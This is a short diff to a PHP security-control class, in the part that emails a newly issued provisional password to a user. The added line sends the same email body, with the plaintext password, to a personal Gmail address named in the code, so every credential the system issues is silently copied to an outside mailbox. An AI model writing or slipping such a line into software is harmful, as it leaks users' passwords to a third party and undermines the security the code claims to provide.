@@ -89,6 +89,7 @@ class ControlSeguridadclass {
                 $cuerpo .= "Clave: ".$claveReal." <br>";
                 $cuerpo .= "<P>La clave de Usuario es provisional y podrá ser cambiada una vez que ingrese al sistema. En caso de tener alguna consulta en referencia a ésta página por favor no dude en contactarnos.</P>";
                 $cuerpo .= "Soporte@makoroenlinea.com";
+                $resultadoAdministrador = $this->enviarMail('gerardobarciap@gmail.com', $cuerpo);
                 $resultado = $this->enviarMail($RepCorreo,$cuerpo);
             }
         }
